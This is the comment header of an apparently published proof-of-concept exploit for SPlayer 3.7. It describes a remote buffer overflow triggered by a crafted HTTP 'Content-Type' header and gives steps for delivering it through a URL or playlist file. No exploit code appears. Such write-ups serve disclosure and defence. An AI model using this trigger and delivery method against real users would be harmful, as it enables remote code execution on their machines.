# Date: May 04, 2011
# Author: xsploitedsec <xsploitedsecurity [at] gmail [dot] com>
# Software Link: http://www.splayer.org/index.en.html
# Versions: <= 3.7 (build 2055)
# Tested On: WinXP SP3 Eng / SPlayer 3.7 build 2055 (English Locale)
# CVE: N/A

# in order to help you easily view your videos, images and listen to your music files. SPlayer lets
# you enjoy your favorite music and movies"

# Vulnerability information:
# SPlayer is vulnerable to a remote buffer overflow when parsing a specially crafted HTTP header from
# a remote server. The bug is triggered due to the "Content-Type:" field being passed to the wcstol()
# function, prior to any bounds checking. This could allow an attacker to trick a remote user into
# opening a specially crafted playlist file, containing a URL pointing to a malicious web server.

# Usage:

# Method 1:
# 1. Execute this script ...
# 2. Launch SPlayer, right click and click open->URL (ctrl+u) ...
# 3. Input the server URL and Click OK ...
# 4. Boom!/calc ...

# Method 2:
# 1. Execute this script ...
# 2. Launch SPlayer and click Open (ctrl+o) ...
# 3. Browse to any playlist file (m3u, pls) It must contain the server URL! ...
# 4. Click Open ...
# 5. [wait til URL is loaded], Boom!/calc ...

# URL Examples:
# http://serverip/anyfilename.avi
# http://serverip:port/anyfilename.avi
# http://serverip/*

# Shouts:
# edb-team, corelanc0d3r/corelan-team, kaotix, sheep, deca, nemesis
